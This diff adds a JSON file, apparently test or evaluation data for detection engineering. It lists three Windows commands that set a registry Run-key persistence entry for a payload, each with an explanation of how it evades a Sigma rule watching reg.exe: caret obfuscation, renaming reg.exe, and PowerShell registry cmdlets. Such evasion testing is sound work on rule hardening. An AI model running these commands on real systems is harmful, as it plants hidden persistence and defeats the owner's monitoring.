@@ -1,0 +1,14 @@
+[
+  {
+    "output": "cmd.exe /c reg a^d^d HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persistence /t REG_SZ /d \"C:\\payload.exe\"",
+    "explanation": "Bypasses the rule using cmd.exe caret (^) obfuscation. The Sigma rule explicitly looks for the exact substring ' add ' (with spaces). By inserting carets, the command line argument becomes 'a^d^d', failing the string match while still executing successfully via the command interpreter."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\reg.exe C:\\Temp\\not_reg.exe && C:\\Temp\\not_reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Persistence /t REG_SZ /d \"C:\\payload.exe\"",
+    "explanation": "Bypasses the 'Image|endswith: \\reg.exe' selection. By copying the native registry editor utility to a new location with a different file name, the execution signature no longer matches the expected process image name, completely evading the rule."
+  },
+  {
+    "output": "powershell.exe -Command \"New-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name 'Updater' -Value 'C:\\payload.exe' -PropertyType String\"",
+    "explanation": "Exploits a blind spot in the rule's scope. The Sigma rule is strictly bound to monitoring the 'reg.exe' tool. Achieving the same persistence objective using alternative Living-Off-The-Land (LOTL) tools like PowerShell's native registry cmdlets evades this specific detection entirely."
+  }
+]
